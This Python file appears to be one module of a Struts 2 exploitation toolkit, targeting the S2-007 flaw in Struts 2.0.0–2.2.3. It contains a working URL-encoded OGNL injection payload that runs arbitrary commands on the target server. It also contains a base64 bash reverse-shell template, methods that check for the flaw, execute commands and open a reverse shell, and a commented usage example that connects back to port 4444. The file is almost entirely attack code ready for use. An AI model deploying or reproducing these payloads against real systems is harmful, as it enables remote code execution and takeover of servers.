from exploit import tools
import urllib.parse

class S2_007:
    """S2-007漏洞检测利用类"""
    info = "[+] S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹Linux shell"
    exec_payload = "'%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))%20%2B%20'"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        if not data:
            self.data = "username=test&password={exp}"
        else:
            self.data = data
        self.headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        html = tools.echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-007'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        data = self.data.format(exp=self.exec_payload.format(cmd=urllib.parse.quote(cmd)))
        html = tools.perform_echo(self,tools.post_stream(self.url, data, self.headers, self.encoding))

        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

# if __name__ == '__main__':
#     s = S2_007("http://192.168.217.138:8080/S2-007/user.action", "name=admin&email=admin&age={exp}")
#     tools._proxies = {
#         "http": "127.0.0.1:8080",
#         "https": "127.0.0.1:8080"
#     }
#     print(s.check())
#     print(s.exec_cmd('ls -la'))
#     s.reverse_shell('192.168.3.134', '4444')